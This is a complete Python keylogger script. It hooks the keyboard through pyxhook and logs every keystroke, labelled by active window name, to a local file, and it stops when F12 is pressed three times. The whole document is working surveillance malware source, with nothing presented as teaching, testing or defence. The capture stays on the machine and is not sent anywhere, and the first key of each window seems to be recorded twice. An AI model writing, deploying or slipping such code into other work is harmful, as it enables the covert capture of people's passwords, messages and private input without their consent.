import pyxhook
import time

def stringreplace(s):
    if(s==None):
        return ""
    elif(len(s)>1):
        return ("("+s+")")
    return s

def keystroke(event):
    global flag, out, prev_window, running, text_file, count, sequence
    text_file = open("./keylogger.log", "a")
    if(count>0 and event.Key!="F12"):
        sequence, count = 0, 0

    if(flag==0):
        flag = flag+1
        out =  out + stringreplace(event.Key)
        prev_window = event.WindowName

    if(prev_window == event.WindowName):
        out =  out +stringreplace(event.Key)
    else:
        text_file.write(out+" [Window:" + prev_window+"]"+"\n")
        print(out+" [Window:" + prev_window+"]")
        flag, prev_window, out = 0, "", stringreplace(event.Key)
    
    if event.Key == "F12":
        count = count+1
        sequence = 1
        if(count==3):
            running = False
    text_file.close()
    
text_file = open("./keylogger.log", "a")

flag, count, sequence, out, prev_window = 0, 0, 0, "", "" ,

if(__name__ == "__main__"):
    global running
    text_file.write("\n\n#######\nNew log\n#######\n\n")
    logger = pyxhook.HookManager()
    # Define our callback to fire when a key is pressed down
    logger.KeyDown = keystroke
    logger.__str__ = ""
    # Hook the keyboard
    logger.HookKeyboard()
    # Start our listener
    logger.start()

    running = True
    while(running):
        time.sleep(0.1)
    logger.cancel()
